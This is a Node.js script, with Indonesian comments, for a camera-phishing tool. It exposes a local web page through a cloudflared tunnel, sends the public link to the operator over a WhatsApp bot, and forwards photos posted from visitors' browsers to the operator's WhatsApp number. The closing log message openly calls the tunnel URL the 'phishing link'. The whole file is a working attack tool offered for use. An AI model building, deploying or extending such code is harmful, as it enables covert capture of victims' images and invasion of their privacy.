const express = require('express')
const fs = require('fs')
const path = require('path')
const qrcode = require('qrcode-terminal')
const Pino = require('pino')
const { exec } = require('child_process')
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys')
const { handleMessage } = require('./lib/handler')

const app = express()
const PORT = 5000

app.use(express.json({ limit: '15mb' }))
app.use(express.static('public'))

// ===== BOT WA =====
let sock
let publicURL = `http://localhost:${PORT}` // fallback

// ===== CLOUDFARED TUNNEL =====
function startTunnel() {
  const tunnel = exec('cloudflared tunnel --url http://localhost:5000')

  tunnel.stdout.on('data', (data) => {
    const match = data.match(/https:\/\/[-\w]+\.trycloudflare\.com/)
    if (match) {
      publicURL = match[0]
      console.log('🌍 Tunnel aktif:', publicURL)
    }
  })

  tunnel.stderr.on('data', (data) => console.log(data))
}

startTunnel()

// ===== START BOT =====
async function startBot() {
  const { state, saveCreds } = await useMultiFileAuthState('./session')
  const { version } = await fetchLatestBaileysVersion()

  sock = makeWASocket({
    auth: state,
    version,
    logger: Pino({ level: 'silent' }),
    browser: ['NiXON-Bot', 'Chrome', '1.0.0']
  })

  sock.ev.on('creds.update', saveCreds)

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect, qr } = update

    if (qr) {
      console.log('\n📱 SCAN QR DI BAWAH INI, JANGAN DIHENTIKAN:\n')
      qrcode.generate(qr, { small: true })
    }

    if (connection === 'open') {
      console.log('✅ Bot NIXON aktif 👩‍💻')

      // isi nomor hp
      sock.sendMessage(
        '628XXXXXXX@s.whatsapp.net',
        { text: `🌐 Web kamera siap:\n${publicURL}` }
      )
    }

    if (connection === 'close') {
      const reason = lastDisconnect?.error?.output?.statusCode
      console.log('⚠️ Koneksi terputus. Reason:', reason)

      if (reason === DisconnectReason.loggedOut) {
        console.log('❌ Logged out. Hapus session lalu scan ulang.')
      } else {
        console.log('⏳ Tunggu 5 detik sebelum reconnect...')
        setTimeout(startBot, 5000)
      }
    }
  })

  sock.ev.on('messages.upsert', async (m) => {
    try {
      await handleMessage(sock, m)
    } catch (e) {
      console.log('❌ Error handler:', e)
    }
  })
}

startBot()

// ===== TERIMA FOTO DARI WEB =====
app.post('/upload', async (req, res) => {
  try {
    const { image } = req.body
    const base64 = image.replace(/^data:image\/png;base64,/, '')
    const file = `foto_${Date.now()}.png`
    const filePath = path.join(__dirname, 'uploads', file)

    fs.writeFileSync(filePath, base64, 'base64')

    // kirim ke wa (wajib pake nomor lu biar foto nya masuk ke wa lu) 
    await sock.sendMessage(
      '628XXXXXXX@s.whatsapp.net',
      {
        image: fs.readFileSync(filePath),
        caption: '📸 foto dari web kamu'
      }
    )

    res.json({ status: true })
  } catch (e) {
    console.log('❌ Error upload:', e)
    res.status(500).json({ status: false })
  }
})

app.listen(PORT, () => {
  console.log(`🌐 Web aktif di http://localhost:${PORT} Silakan cek di terminal termux/panel ambil link phishing nya`)
})
